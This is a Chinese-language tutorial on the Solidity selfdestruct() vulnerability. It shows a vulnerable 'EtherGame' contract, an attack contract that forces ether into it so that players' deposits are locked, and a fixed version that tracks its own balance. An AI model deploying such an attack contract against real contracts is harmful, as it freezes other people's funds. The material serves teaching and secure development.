自毁函数
==

漏洞介绍
--

<code>selfdestruct()</code>由以太坊智能合约提供，用于销毁区块链上的智能合约。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。  
与删除硬盘上数据的不同是，即使合约被自毁移除，它仍然是区块链历史数据的一部分，可能被大多数以太坊节点保留。当有人发送ETH到自毁的合约时，ETH将永久丢失。 
恶意合约可以使用<code>selfdestruct()</code>强制向任何合约发送ETH。  

漏洞案例
--

1.漏洞合约是一个抢7游戏，每位玩家使用<code>deposit</code>方法每次向游戏合约发送1 ETH，当游戏合约内余额为7 ETH时，第7个玩家将会获得胜利获得7 ETH  

    contract EtherGame {
        uint public targetAmount = 7 ether;
        address public winner;

        function deposit() public payable {
            require(msg.value == 1 ether, "You can only send 1 Ether");

            uint balance = address(this).balance;
            require(balance <= targetAmount, "Game is over");

            if (balance == targetAmount) {
                winner = msg.sender;
            }
        }

        function claimReward() public {
            require(msg.sender == winner, "Not winner");

            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }

2.攻击合约使用<code>selfdestruct()</code>向<code>EtherGame</code>发送ETH，由于绕过了<code>deposit</code>的判断逻辑，可以发送任意数量的ETH。当攻击后游戏合约内ETH余额>=7时，由于合约逻辑判断游戏已经结束，且未产生winner，之前发送ETH的玩家将永远无法取出ETH，造成游戏合约瘫痪。

  contract Attack {
      EtherGame etherGame;

      constructor(EtherGame _etherGame) {
          etherGame = EtherGame(_etherGame);
      }

      function attack() public payable {
          // You can simply break the game by sending ether so that
          // the game balance >= 7 ether

          // cast address to payable
          address payable addr = payable(address(etherGame));
          selfdestruct(addr);
      }
  }
  
修复建议
--

不要只依赖于<code>address(this).balance</code>判断合约内的余额，可以通过设置一个<code>balance</code>变量来计算合约内的余额，只有通过合约内方法转账才会增加余额。  
这样就算通过<code>selfdestruct()</code>进行强制转账也不会影响合约的余额，防止合约瘫痪。  

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.13;

    contract EtherGame {
        uint public targetAmount = 3 ether;
        uint public balance;
        address public winner;

        function deposit() public payable {
            require(msg.value == 1 ether, "You can only send 1 Ether");

            balance += msg.value;
            require(balance <= targetAmount, "Game is over");

            if (balance == targetAmount) {
                winner = msg.sender;
            }
        }

        function claimReward() public {
            require(msg.sender == winner, "Not winner");

            (bool sent, ) = msg.sender.call{value: balance}("");
            require(sent, "Failed to send Ether");
        }
    }
